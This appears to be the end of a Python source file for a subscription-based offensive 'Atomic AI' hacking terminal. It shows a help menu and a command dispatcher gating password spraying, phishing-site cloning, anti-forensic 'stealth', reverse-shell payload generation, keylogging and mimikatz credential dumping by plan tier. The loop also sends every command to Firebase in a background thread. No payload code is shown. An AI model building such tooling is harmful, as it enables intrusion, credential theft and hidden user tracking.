        ('spray <target> <ul> <pass>', 'Password spray — 1 pass, many users'),
        ('fuzz <url>',                 'HTTP fuzzer — find crashes and vulns'),
        ('recon <domain>',             'Full domain recon — DNS/ports/tech/emails'),
        ('enum <host>',                'Full host enumeration — OS/services/vulns'),
        ('stealth',                    'Anonymity mode — MAC spoof + clear history'),
        ('phish <url>',                'Clone a website for security testing'),
        ('tunnel <host> <ports>',      'SSH tunnel / port forwarding'),
        ('nmap <target> [flags]',      'Network mapper & port scanner'),
        ('masscan <target> -p <ports>','Ultra-fast mass port scanner'),
        ('sqlmap <url> [opts]',        'SQL injection scanner'),
        ('hydra <opts>',               'Password brute-forcer'),
        ('nikto <host>',               'Web vulnerability scanner'),
        ('gobuster <opts>',            'Directory & DNS brute-forcer'),
        ('hashcat <opts>',             'GPU password cracker'),
        ('john <hashfile>',            'Password cracker (CPU)'),
        ('aircrack <cap> -w <wl>',     'WPA/WPA2 handshake cracker'),
    ])
    if is_max:
        section('MAX ONLY', [
            ('backdoor',              'Generate reverse shell payloads'),
            ('keylog [seconds]',      'Record keystrokes on this machine'),
            ('mimikatz',              'Dump Windows credentials (Windows only)'),
            ('run <cmd> [args]',      'Execute any system command directly'),
        ])
    section('UTILS', [
        ('pass [add|get|list|del]',   'Encrypted local password vault'),
        ('decode <string>',           'Decode base64/hex/JWT/binary/URL/ROT13'),
        ('report',                    'Generate pentest report from session logs'),
        ('vpncheck',                  'Check VPN status + DNS leak detection'),
        ('reset',                     'Reset AI conversation history'),
    ])

# ── PROMPT ─────────────────────────────────────────────────────────────────────
def prompt():
    plan = SESSION['plan']
    role = SESSION['role']
    name = SESSION['displayName']
    badge = f'{PK}[DEV]{RST}' if role == 'dev' else {'pro': f'{CY}[PRO]{RST}', 'max': f'{YL}[MAX]{RST}'}.get(plan, '')
    return f'{DG}{name}{RST}{badge}{G}@atomic{RST}{DM}:{RST}{G}~$ {RST}'

# ── MAIN LOOP ─────────────────────────────────────────────────────────────────
def main_loop():
    clr()
    glitch_logo()
    print()
    print(f'{DM}{"─"*56}{RST}')
    plan  = SESSION['plan']
    role  = SESSION['role']
    badge = f'{PK}DEV{RST}' if role == 'dev' else {'pro': f'{CY}PRO{RST}', 'max': f'{YL}MAX{RST}'}.get(plan, f'{DM}FREE{RST}')
    print(f'  {G}Welcome back, {WH}{SESSION["displayName"]}{RST}   Plan: {badge}')
    print(f'  {DM}Type  help  for commands.  Just talk to chat with Atomic AI.{RST}')
    print(f'{DM}{"─"*56}{RST}')
    print()

    while True:
        try:
            raw = input(prompt()).strip()
        except (KeyboardInterrupt, EOFError):
            print()
            typewrite('  Session terminated. Stay safe.', DM, 0.02)
            sys.exit(0)

        if not raw:
            continue

        parts = raw.split()
        cmd   = parts[0].lower()
        args  = parts[1:]

        # Log every command to Firebase (runs in background, never blocks)
        threading.Thread(target=log_activity, args=(cmd, ' '.join(args)), daemon=True).start()

        plan   = SESSION['plan']
        role   = SESSION['role']
        is_pro = plan in ('pro','max') or role == 'dev'
        is_max = plan == 'max' or role == 'dev'

        print()

        if cmd in ('exit','quit','q','logout'):
            typewrite('  Session terminated. Stay safe.', DM, 0.02)
            sys.exit(0)

        elif cmd == 'clear':
            clr()
            continue

        elif cmd == 'help':         cmd_help(args)
        elif cmd == 'whoami':       cmd_whoami(args)
        elif cmd == 'status':       cmd_status(args)

        elif cmd == 'reset':
            SESSION['history'] = []
            p('  AI conversation cleared.', DG)

        elif cmd == 'myip':         cmd_myip(args)

        elif cmd == 'ping':
            if not is_pro: pe('  Requires Pro plan.')
            else: cmd_ping(args)

        elif cmd == 'trace':
            if not is_pro: pe('  Requires Pro plan.')
            else: cmd_trace(args)

        elif cmd == 'scan':
            if not is_pro: pe('  Requires Pro plan.')
            else: cmd_scan(args)

        elif cmd == 'banner':
            if not is_pro: pe('  Requires Pro plan.')
            else: cmd_banner(args)

        elif cmd in ('dig','dns'):
            if not is_pro: pe('  Requires Pro plan.')
            else: cmd_dig(args)

        elif cmd == 'whois':
            if not is_pro: pe('  Requires Pro plan.')
            else: cmd_whois(args)

        elif cmd == 'nmap':
            if not is_pro: pe('  Requires Pro plan.')
            else: cmd_nmap(args)

        elif cmd == 'masscan':
            if not is_pro: pe('  Requires Pro plan.')
            else: cmd_masscan(args)

        elif cmd == 'sqlmap':
            if not is_pro: pe('  Requires Pro plan.')
            else: cmd_sqlmap(args)

        elif cmd == 'hydra':
            if not is_pro: pe('  Requires Pro plan.')
            else: cmd_hydra(args)

        elif cmd == 'nikto':
            if not is_pro: pe('  Requires Pro plan.')
            else: cmd_nikto(args)

        elif cmd == 'gobuster':
            if not is_pro: pe('  Requires Pro plan.')
            else: cmd_gobuster(args)

        elif cmd == 'hashcat':
            if not is_pro: pe('  Requires Pro plan.')
            else: cmd_hashcat(args)

        elif cmd == 'john':
            if not is_pro: pe('  Requires Pro plan.')
            else: cmd_john(args)

        elif cmd == 'aircrack':
            if not is_pro: pe('  Requires Pro plan.')
            else: cmd_aircrack(args)

        elif cmd == 'netscan':
            if not is_pro: pe('  Requires Pro plan.')
            else: cmd_netscan(args)

        elif cmd == 'crack':
            if not is_pro: pe('  Requires Pro plan.')
            else: cmd_crack(args)

        elif cmd == 'osint':
            if not is_pro: pe('  Requires Pro plan.')
            else: cmd_osint(args)

        elif cmd == 'monitor':
            if not is_pro: pe('  Requires Pro plan.')
            else: cmd_monitor(args)

        elif cmd == 'wifi':
            if not is_pro: pe('  Requires Pro plan.')
            else: cmd_wifi(args)

        elif cmd == 'phish':
            if not is_pro: pe('  Requires Pro plan.')
            else: cmd_phish(args)

        elif cmd == 'sniff':
            if not is_pro: pe('  Requires Pro plan.')
            else: cmd_sniff(args)

        elif cmd == 'vpncheck':
            cmd_vpncheck(args)

        elif cmd == 'darkweb':
            if not is_pro: pe('  Requires Pro plan.')
            else: cmd_darkweb(args)

        elif cmd in ('exploit', 'cve'):
            if not is_pro: pe('  Requires Pro plan.')
            elif cmd == 'exploit': cmd_exploit(args)
            else: cmd_cve(args)

        elif cmd == 'stealth':
            if not is_pro: pe('  Requires Pro plan.')
            else: cmd_stealth(args)

        elif cmd == 'brutelogin':
            if not is_pro: pe('  Requires Pro plan.')
            else: cmd_brutelogin(args)

        elif cmd == 'decode':
            cmd_decode(args)

        elif cmd == 'enum':
            if not is_pro: pe('  Requires Pro plan.')
            else: cmd_enum(args)

        elif cmd == 'spray':
            if not is_pro: pe('  Requires Pro plan.')
            else: cmd_spray(args)

        elif cmd == 'backdoor':
            if not is_max: pe('  Requires Max plan.')
            else: cmd_backdoor(args)

        elif cmd == 'tunnel':
            if not is_pro: pe('  Requires Pro plan.')
            else: cmd_tunnel(args)

        elif cmd == 'pass':
            cmd_pass(args)

        elif cmd == 'fuzz':
            if not is_pro: pe('  Requires Pro plan.')
            else: cmd_fuzz(args)

        elif cmd == 'recon':
            if not is_pro: pe('  Requires Pro plan.')
            else: cmd_recon(args)

        elif cmd == 'keylog':
            if not is_max: pe('  Requires Max plan.')
            else: cmd_keylog(args)

        elif cmd == 'mimikatz':
            if not is_max: pe('  Requires Max plan.')
            else: cmd_mimikatz(args)

        elif cmd == 'report':
            cmd_report(args)

        elif cmd == 'hashid':
            cmd_hashid(args)

        elif cmd == 'facesearch':
            if not is_pro: pe('  Requires Pro plan.')
            else: cmd_facesearch(args)

        elif cmd == 'lookup':
            if not is_pro: pe('  Requires Pro plan.')
            else: cmd_lookup(args)

        elif cmd == 'track':
            if not is_pro: pe('  Requires Pro plan.')
            else: cmd_track(args)

        elif cmd == 'timeline':
            if not is_pro: pe('  Requires Pro plan.')
            else: cmd_timeline(args)

        elif cmd == 'socialmap':
            if not is_pro: pe('  Requires Pro plan.')
            else: cmd_socialmap(args)

        elif cmd == 'records':
            if not is_pro: pe('  Requires Pro plan.')
            else: cmd_records(args)

        elif cmd == 'run':
            cmd_run(args)

        elif cmd == 'sudo':
            shell_exec(raw)

        else:
            # Unknown command → try to run as real shell command, else AI
            binary = parts[0]
            is_real_cmd = shutil.which(binary) is not None
            if is_real_cmd:
                shell_exec(raw)
            else:
                stream_ai(raw)

        print()

# ── ENTRY ──────────────────────────────────────────────────────────────────────
def main():
    signal.signal(signal.SIGINT, lambda s, f: (print(), sys.exit(0)))

    cfg = _load_cfg()

    # First run: show disclaimer + install tools
    if not cfg.get('installed'):
        show_disclaimer()
        install_tools()
        cfg = _load_cfg()

    # Always show disclaimer if not yet accepted
    if not cfg.get('disclaimer_accepted'):
        show_disclaimer()

    boot_sequence()
    login_screen()
    main_loop()

if __name__ == '__main__':
    main()
